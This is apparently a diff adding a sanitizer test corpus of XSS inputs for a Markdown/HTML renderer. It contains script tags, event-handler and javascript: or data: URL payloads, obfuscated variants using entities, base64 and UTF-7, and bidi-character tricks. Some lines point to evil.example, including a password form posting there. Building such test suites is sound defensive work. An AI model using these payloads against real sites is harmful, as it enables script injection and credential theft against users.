+{X:ef}{X:bb}{X:bf}<script>alert(1)</script>
+{X:fe}{X:ff}<script>alert(1)</script>
+{X:ff}{X:fe}<script>alert(1)</script>
+{U+2028}<script>alert(1)</script>
+{U+2029}<script>alert(1)</script>
+{U+0085}<script>alert(1)</script>
+{U+000B}<script>alert(1)</script>
+{U+000C}<script>alert(1)</script>
+a{U+000D}<script>alert(1)</script>
+a{U+000D}{U+000A}<script>alert(1)</script>
+{U+202E}<script>alert(1)</script>
+{U+202E}<img src=x onerror=alert(1)>
+{U+2066}<script>alert(1)</script>{U+2069}
+{U+202A}<script>alert(1)</script>{U+202C}
+{U+202D}<script>alert(1)</script>{U+202C}
+{U+200F}[a](javascript:alert(1)){U+200E}
+{U+E0001}{U+E0073}{U+E0063}<script>alert(1)</script>
+:){U+202E}<script>alert(1)</script>
+:lol:{U+0000}<script>alert(1)</script>
+
+%% category: raw html passthrough
+<img src=x>
+<img src="https://evil.example/x.png">
+<img src="/x.png" alt="x">
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="https://evil.example/"></iframe>
+<iframe src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<object data="javascript:alert(1)"></object>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<embed src="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)</script>">
+<applet code="x"></applet>
+<base href="https://evil.example/">
+<base href="javascript:alert(1)//">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<meta charset="utf-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<link rel="stylesheet" href="https://evil.example/x.css">
+<link rel="import" href="https://evil.example/x.html">
+<style>@import url(https://evil.example/x.css);</style>
+<style>body{background:url(javascript:alert(1))}</style>
+<form action="javascript:alert(1)"><input type=submit></form>
+<form action="https://evil.example/"><input name=password></form>
+<form><button formaction="javascript:alert(1)">x</button></form>
+<input type=image src=x onerror=alert(1)>
+<isindex action="javascript:alert(1)" type=image>
+<a href="javascript:alert(1)">x</a>
+<a href="data:text/html,x">x</a>
+<a href="https://evil.example/" target=_blank>x</a>
+<a href="https://evil.example/" ping="https://evil.example/p">x</a>
+<a href="x" download>x</a>
+<a name="x" id="y">x</a>
+<div id="x" name="y" class="z">x</div>
+<div style="position:fixed;top:0;left:0;width:100%;height:100%">x</div>
+<div>{U+000A}hello{U+000A}</div>
+<div>{U+000A}{U+000A}<script>alert(1)</script>{U+000A}{U+000A}</div>
+<div>{U+000A}{U+000A}**x**{U+000A}{U+000A}</div>
+<table><tr><td onclick=alert(1)>x</td></tr></table>
+<h1 onclick=alert(1)>x</h1>
+<details><summary>x</summary><p onclick=alert(1)>y</p></details>
+<video src=x onerror=alert(1)></video>
+<audio><source src=x onerror=alert(1)></audio>
+<canvas id=c></canvas><script>c.getContext('2d')</script>
+<portal src="https://evil.example/"></portal>
+<dialog open onclose=alert(1)><form method=dialog><button>x</button></form></dialog>
+<marquee>x</marquee>
+<blink>x</blink>
+<font color=red>x</font>
+<center>x</center>
+<xss>x</xss>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
+<html xmlns:html="http://www.w3.org/1999/xhtml"><html:script>alert(1)</html:script></html>
+<body background="javascript:alert(1)">
+<body onpageshow=alert(1)>
+<html><head></head><body><script>alert(1)</script></body></html>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+</iframe><script>alert(1)</script>
+<a href="/x">x</a><a href="/y">y</a><script>alert(1)</script>
+<br><br><br><script>alert(1)</script>
+<br/ onclick=alert(1)>
+<p/onclick=alert(1)>x</p>
+<p onclick=alert(1)//
+<p <script>alert(1)</script>
+<p="<script>alert(1)</script>">
+<<script>alert(1)//<</script>
+<<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)//
+<img src="x"onerror="alert(1)">
+<img src=`x`onerror=alert(1)>
+<img src = x onerror = alert(1)>
+<img{U+000A}src=x{U+000A}onerror=alert(1)>
+<img{U+0009}src=x{U+0009}onerror=alert(1)>
+<img{U+000C}src=x{U+000C}onerror=alert(1)>
+<img{U+000D}src=x{U+000D}onerror=alert(1)>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=top['al'+'ert'](1)>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<a href="https://example.com/">x</a onclick=alert(1)>
+</a onclick=alert(1)>
+</img src=x onerror=alert(1)>
+</p><img src=x onerror=alert(1)>
+<img src=x onerror=alert(1){U+0020}
+<img src=x onerror=alert(1)
+<a href=
+<a href="
+<a href='
+<a
+<
+
+%% category: mixed and structural
+## [a](javascript:alert(1))
+### ![a](javascript:alert(1))
+Setext <script>alert(1)</script>{U+000A}=====
+Setext [a](javascript:alert(1)){U+000A}-----
+- [a](javascript:alert(1))
+- ![a](javascript:alert(1))
+- [a](/x" onclick="alert(1))
+1) <script>alert(1)</script>
+99999999999. <script>alert(1)</script>
+0. <script>alert(1)</script>
+7. [a](javascript:alert(1)){U+000A}8. ![a](data:text/html,x)
+- a{U+000A}  - b{U+000A}    - <script>alert(1)</script>
+* [ ] <script>alert(1)</script>
+| a | b |{U+000A}|---|---|{U+000A}| <script>alert(1)</script> | [a](javascript:alert(1)) |
+~~<script>alert(1)</script>~~
+~~[a](javascript:alert(1))~~
+**[a](javascript:alert(1))**
+*![a](javascript:alert(1))*
+__<script>alert(1)</script>__
+***[a](javascript:alert(1))***
+**a [b](javascript:alert(1)) c**
+[**a**](javascript:alert(1))
+[*a*](/x" onclick="y)
+[![a](/x.png)](javascript:alert(1))
+[![a](javascript:alert(1))](/x)
+[![a](/x.png" onerror="alert(1))](/y)
+[[a](/x)](javascript:alert(1))
+[a [b](javascript:alert(1)) c](/x)
+[a](/x)[b](javascript:alert(1))[c](/y)
+[a](/x)(javascript:alert(1))
+[a]](javascript:alert(1))
+[a(javascript:alert(1))
+[a](javascript:alert(1)
+[a](javascript:alert(1)))
+[[[[[[[a](javascript:alert(1))
+[a](((((((javascript:alert(1))
+\[a](javascript:alert(1))
+[a\](javascript:alert(1))
+[a]\(javascript:alert(1))
+\<script>alert(1)</script>
+&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+&#38;lt;script&#38;gt;alert(1)&#38;lt;/script&#38;gt;
+&lt;img src=x onerror=alert(1)&gt;
+&bogus;<script>alert(1)</script>
+&#0;<script>alert(1)</script>
+&#x110000;<script>alert(1)</script>
+&#xD800;<script>alert(1)</script>
+&#99999999999;<script>alert(1)</script>
+&NotExists;
+&amp
+&#
+&#x
+:)<img src=x onerror=alert(1)>:(
+:lol:<script>alert(1)</script>:D
+;)[a](javascript:alert(1)):)
+:D![a](javascript:alert(1)):D
+:)`<script>alert(1)</script>`:)
+:)||<script>alert(1)</script>||:)
+:)https://www.youtube.com/watch?v=dQw4w9WgXcQ:)
+x:)y:(z:Dw;)v
+text{U+000A}https://www.youtube.com/watch?v=dQw4w9WgXcQ{U+000A}text <script>alert(1)</script>
+https://www.youtube.com/watch?v=dQw4w9WgXcQ{U+000A}https://x.com/a/status/1{U+000A}<script>alert(1)</script>
+a{U+000A}{U+000A}<script>alert(1)</script>{U+000A}{U+000A}b
+a  {U+000A}<script>alert(1)</script>
+a\{U+000A}<script>alert(1)</script>
+a{U+000A}    <script>alert(1)</script>
+a{U+000A}{U+0009}<script>alert(1)</script>
+{U+000A}{U+000A}{U+000A}<script>alert(1)</script>
+   <script>alert(1)</script>
+{U+0009}{U+0009}{U+0009}<script>alert(1)</script>
